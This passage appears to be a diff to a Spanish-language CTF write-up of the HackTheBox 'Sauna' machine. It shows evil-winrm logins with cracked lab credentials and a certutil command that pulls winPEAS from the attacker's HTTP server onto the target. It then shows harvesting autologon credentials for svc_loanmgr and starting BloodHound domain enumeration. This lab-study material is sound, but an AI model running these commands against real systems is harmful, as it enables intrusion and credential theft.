@@ -69,5 +69,51 @@ hashcat -m 18200 hashfSmith /usr/share/wordlists/rockyou.txt --force
 ![](Pasted%20image%2020260505172257.png)
 
 
+Usando la aplicación evil-winrm podremos tener acceso a una shell a su sistema como fsmith 
 
-## Escalado de privilegios
+```bash
+evil-winrm -i 10.129.29.44 -u fsmith -p Thestrokes23
+```
+
+![](Pasted%20image%2020260505173114.png)
+
+En su escritorio conseguiremos encontrar la primera flag
+
+![](Pasted%20image%2020260505173206.png)
+## Escalado de privilegios 
+
+Para enumerar el sistema usaremos WinPeas, para ello nos lo descargaremos creando en nuestro equipo un servidor python y luego usando certutil en Windows para instalarlo. Seguidamente podremos ejecutar el pograma y esperaremos a que nos de un diagnóstico
+
+```powershell
+certutil -urlcache -f http://10.10.14.180:8000/winPEASx64.exe Winpeas.exe
+```
+
+![](Pasted%20image%2020260505173812.png)
+
+```powershell
+C:\Users\FSmith\Desktop> .\Winpeas.exe cmd fast > sauna_winpeas_fast
+```
+
+En el fichero conseguimos encontrar unas credenciales de Autologon que posiblemente sean muy útiles
+
+![](Pasted%20image%2020260505174435.png) 
+
+Mirando los usuarios que hay con "net user" podemos ver que no existe el usuario svc_loanmanager pero sí existe svc_loanmgr que es muy parecido
+
+![](Pasted%20image%2020260505174725.png) 
+
+Así que probaremos a iniciar sesión con este usuario con evil-winrm y estaremos dentro exitosamente
+
+```bash
+evil-winrm -i 10.129.29.44 -u svc_loanmgr -p Moneymakestheworldgoround!
+```
+
+![](Pasted%20image%2020260505174910.png)
+
+
+Ahora procederemos a iniciar bloodhound para visualizar como está organizado el Directorio Activo, además de poder saber que vector de ataque en cadena podemos llevar para elevar privilegios 
+
+```bash
+bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.129.29.44 -c All
+``` 
+
